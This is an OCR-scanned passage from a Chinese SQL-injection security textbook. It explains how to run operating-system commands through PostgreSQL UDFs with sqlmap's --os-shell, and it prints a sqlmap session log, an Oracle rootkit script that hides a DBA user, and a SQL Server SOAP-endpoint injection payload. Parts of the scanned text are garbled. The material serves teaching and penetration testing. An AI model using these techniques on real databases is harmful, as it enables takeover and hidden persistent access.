在PostgreSQL数据库中，执行操作系统命令最主要的方式之一，就是调用用户自定义函
数(User-Defined Function，UDF)。在SQL数据库中，用户自定义函数提供了一种扩展数据库
服务器功能的机制，它可以添加函数，从而在SQL语句中可以调用这些新添加的函数。SQL
标准对标量（scalar）函数与表函数进行了区分。标量函数仅返回单个值（或者NULL)
与MySQL类似，在PostgreSQL中可以创建一个基于操作系统本地共享库的UDF，在2009
年欧洲黑帽会议上，Bemardo Damele演示了他发现的技术，说明了在PostgreSQL中使用UDF
成功实现执行操作系统代码的间题。主要的间题在于，在PostgreSQL8.2版本中所有共享库都
必须包含一个magic block，并要求在编译时添加该magic block。
对于存在于本地操作系统之上的共享库，库中将没有magic block声明。我们必须上传具
有该声明的我们自己的共享库。在PostgreSQL中，可以将UDF 放在PostgreSQL用户具有读/
写访问权限的任何位置。在Linux/UNIX系统中通常位于/tmp目录，在Windows系统中通常位
于 c:windowstemp 目录。
提示：
要包含magicblock，在已经包含了头文件fmgr.h之外，还需要在源文件的其中一个模块（仅
能有一个模块）中包含下面的指令：
ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif
Sqlmap工具已经内置了这样的功能，攻击者可以使用开关--os-shell来执行操作系统命令。
下面的步骤就是使用Sqlmap执行OS代码并查看命令输出的过程：
●在TEMP文件夹中上传一个用户共享库(lib_postgresqludf_sys)
·使用该共享库创建一个函数（sys_eval)
·使用UNION技术或SQL盲注技术，执行该函数并读取输出结果
下面是一个使用Sqlmap在PostgreSQL数据库上执行操作系统命令的示例：
n- Ad·dewtbs/dewbs/eseqeep/4seued/ dua/:aqgoox
http://10.10.10.114/test.php?1d=1 =-0s-she11
sqlmap/0.9-dev - automatic SQL injection and database takeover too1
http:/ /sqlmap.sourceforge.net
[*] starting at: 17:15:30
[17:15:30] [INFO] using */pentest/database/sqlmap/output/10.10.10.114/
session* as session file
[17:15:30] [INFo] testing connection to the target url
[17:15:30] [INFO] testing if the url is stable, ait a fev seconds
[17:15:31][INFO]uz1 is stable
267
---
## Page 282
SQL注入攻击与防御（第2版）
[17:15:31] [INFO] GET parameter 'id’ is dynamic
[17:15:31][INFo] (error based) heuristics shows that GET parameter
'id′ is injectable (possible DBMS: PostgreSQL)
[17:15:31] [INFo] testing sql injection on GET parameter *id* with 0
parenthesis
[17:l5:31] [INFo] testing unescaped numeric (AND) injection on GET
parameter 'id*
a0 uo uotoa{uT(Nv) oxownu podeosoun dutuxguoo[0aN11[t:t:t]
parameter 'id'
[17:15:31] [INFo] GET parameter *id' is unescaped numeric (AND)
injectable ith 0 parenthesis
T ,uobyxoe, xoowexed uoyxosn T 5uaso [oaN1] [tc:st:t]
dynamic
[17:15: 31]
[17:15:31] [INF0] testing for parenthesis on injectable parameter
[17:15: 31]
[INFo] the injectable parameter requires O parenthesis
[17:15:31]
][INFo] testing PostgreSQL
[17:15:31]
[OINI]
confirming PostgreSQL
[17:15:31]
][INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
web app1ication technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: PostgreSQL
[17:15:31][INF0] testing stacked queries sq] injection on parameter
'id'
[17:15:31] [INFo] detecting back-end DBMS version from its banner
[17:15: 31]
[INFO] retrieved: 8.3.8
[17:15:37] [INFo] the target ur] is affected by a stacked queries sq1
injection on parameter *id*
[17:15:37]
[INFO]
[17:15: 37]
[INFO]
the back-end DBMS operating system is Linux
[17:15:37] [INF0]
testing if current user is DBA
[17:15: 37]
[OINI]
retrieved: 1
[17:15:37]
[INFO]
checking if UDF *sys_eval* already exist
[17:15: 37]
[INFO]
[INFO]
retrieved: 0
[17:15:37]
checking if UDF *sys_exec′ already exist
[17:15:37]
[INFO]
retrieved: 0
[17:15:37]
[OaNI]
[17:15:37][INFO]
otTg an Kzeutq oua woxg ,oaxas.s, aan burqeaio
[17:15:37][INF0] going to use injected sys_eval and sys_exec userdefined
[17:15:37] [INFo] calling Linux Os shel1. To quit type *×′ or *q* and
press ENTER
  hoami
[17:15:51][INFO] retrieved: postgres
command standard output: *postgres*
268
---
## Page 283
第6章利用操作系统
6.4巩固访问
一旦完整的折中方案受到影响，有胆量的分析员便会发现多个机会。2002年，ChrisAnley
发布了针对SQLServer的“三字节补丁”，它能通过反转条件跳转（conditionaljump）代码分支的
逻辑来有效禁用系统上的验证。这虽然看起来很不错，但我们却无法想象如此多的顾客在进行
这种测试时，他们能够非常愉快地承受较高级别的曝光。
本书的供稿作者之—Alexander Konbrust 和 NGS Software 公司的 David Litchfield大范
围公布了数据库rootkit（一种特殊类型的恶意软件）的存在和创建。它们能有效颠覆数据库的安全，
就像传统rootkit颠覆操作系统的安全一样。因为是新概念，所以它们非常有效，而系统rootkit
已经存在数十年了。
下面的示例代码通过更新表中的一行实现了一种Oraclerootkit：
-- the following code must run as DBA
SQL> grant dba to hidden identified by hidden_2009; -- create a user
hidden with DBA privileges
SQL> select sys,kupp$proc.disable_multiprocess from dual; -- this
SELECT statement is needed for newer version of Oracle (10.2.0.5,
11.1.0.7, 11.2.0.x) to activate the identity change
SQL> exec sys.kuppSproc.change_user('SYs*) ; -- become user SYS
-- change the users record in sys,user$
SQL> update sys.user$ set tempts#=666 where name=*HIDDEN′;
-= does not show the user HIDDEN
SQL> select username from dba_users;
-= but the connect works
SQL> connect hidden/hidden_2009
这里简单解释一下上述代码起作用的原因.Oracle 使用ALL_USERS 和DBA_USERS 视图
来显示用户列表，这些视图包含了三张表的并集。通过将 tempts(或datats#或typem）设置成不
存在的值，可以从并集结果和视图中清除用户：
CREATE OR REPLACE FORCE VIEW "SYS".*ALL_USERS" (*USERNAME", "USER_ID",
"CREATED") AS
select u.name, u.user#, u.ctime
from sys.user$ u, sys.tss dts, sys.ts$ tts
vhere u.datatsf - dts.ts#
and u.tempts# = tts,ts#
and u.type# = 1
可以从下列Web站点找到关于Oracle rootkit的更多信息：
●www.red-database-sccurity.com/wp/db_rootkits_us.pdf
●www. databasesccurity.com/wp/oracle-backdoors.ppt
2008年，本书的两个供稿作者Marco Slaviero和Haroon Meer展示了较新版本的SQLServer
固有的能力—通过htp.sys（管理IS的同一内核组件）暴露基于SOAP（简单对象访问协议）的
Web服务。这意味着获取了必需权限的攻击者可以创建一个绑定于SQL存储过程的HTTP债
听器。图6-27中的图像集简单展示了这一攻击过程。我们注意到，从左边开始，/test 返回了
Web服务器上的一个页面。中间的查询管理器窗口在/test 路径中创建了endpoint2端点。接下
269
---
## Page 284
SQL注入攻击与防御（第2版）
来的两幅图像表明/test页面确实已被重写。
(!)
图6-27在 SQL Server 中创建 SOAP 端点
上述示例中选择的架构很奇怪，它允许使用SQL中的CREATEENDPOINT命令有效重写
Web服务器上的/test 页面。这些都是蓄意安排的，因为我们已经使用 http.sys 为 SQL Server赋
予了较高的权限。
虽然只创建一个DoS(DenialofService，拒绝服务）条件很有趣，但如果考虑到可能将端点
连接到存储过程，那么它的实用性会相应得到提高。存储过程可以接收发送的命令，之后再在
服务器上评估这些命令。幸运的是，这不是必需的，因为创建 SOAP端点时，SQLServer本身
支持 sqlbatch。 提 MSDN 个细(http:/msdn.microsoff.com/en-us/library/ms345123.aspx, Sarsfield 和
Raghavan):
“使用T-SQL命令启用端点上的批处理时，端点会隐式暴露另一种名为 sqlbatch的 SOAP
方法。sqlbatch方法可以通过SOAP来执行T-SQL语句。”
这意味着在遇到前面例子中使用的简单注入点时，我们可以发出请求来创建需要的SOAP
端点：
username=* exec (*CREATE ENDPOINT ep2 STATE=STARTED AS HTTP
 (. (G3TEVN3=S3HO±V8)
上述代码在victim服务器的/sp目录中创建了一个 SOAP端点，我们可以在该端点上瞄准
其，它可以与最新创建的端点进行通信。
ele Soer @uery Mle1 for sqtoetcs Dndpoint
poter Locsl ara
图6-28针对已创建端点且基于 Perl 的 SOAP查询
270
---
## Page 285
第6章利用操作系统
6.5本章小结
本章介绍了如何使用SQL注入攻击来攻击正在运行数据库服务器的主机。当今大多数现
代RDBMS都内置了从文件系统读写文件的能力以及执行操作系统命令的能力。进一步讲，这
意味着多数SQL注入攻击者可以使用这些功能。
分高手和菜鸟的渗透测试技术。本章展示了在SQL注入攻击内部对大多数著名的应用架构使
用文件读取、文件写和命令执行等基础知识是多么简单。
有了这些基础知识后，便可以继续学习第7章的内容。第7章将介绍与高级SQL注入相
关的专题。
6.6快速解决方案
1.访问文件系统
下列内容与使用SQL注入从文件系统读取文件有关：
●在MySQL中，可以使用LOADDATAINFILE和LOAD_FILEO命令从主机读取任何
文件。
●在Microsof SQLServer中，可以使用BULKINSERT或OLEAutomation从文件系统读取
文件。对于较新的系统(SQLServer 2005及之后的版本)，可以使用CRE47EASSEMBLY
方法从文件系统读取文件。
·在Oracle中，可以使用Oracle目录、OracleText或UTL_FILE方法读取文件。
下列内容与使用SQL注入向文件系统写文件有关：
·在MySQL中，可以使用select into outfile和select into dumpfile命令向文件系统写文件。
●在Microsof SQL Server 中，可以使用OLEAutomation和简单的重定向（通过命令执行)
在目标文件系统中创建文件。可以从命令行使用debug.exe和BCP，进而在目标系统中
辅助创建二进制文件。
●在 Oracle 中，可以使用 UTL_FILE、DBMS_ADVISOR、DBMS_XSLPROCESSOR、
DBMS_XMLDOM、Java或操作系统命令和标准重定向来实现文件写操作。
2.执行操作系统命令
●在MySQL和PostgreSQL中，可以借助SQL创建一个用户自定义函数(UDF)以执行操
作系统命令，PostgreSQL支持执行堆叠查询，因此这种攻击很容易实现。推荐使用
Sqlmap执行这种攻击。绝大多数Web框架不允许对MySQL执行堆叠查询，因此这种
攻击在MySQL中不太有效。为了创建用户自定义函数，数据库用户必须是一个
sysadmin 用户。在 Microsoft SQL Server 中，可以通过诸如 xp_cmdshell这样的存储过
程来执行命令，或者通过OLEAutomation或新的CLR集成特性来执行命令。为了能
够执行OS代码，数据库用户必须具有sysadmin角色。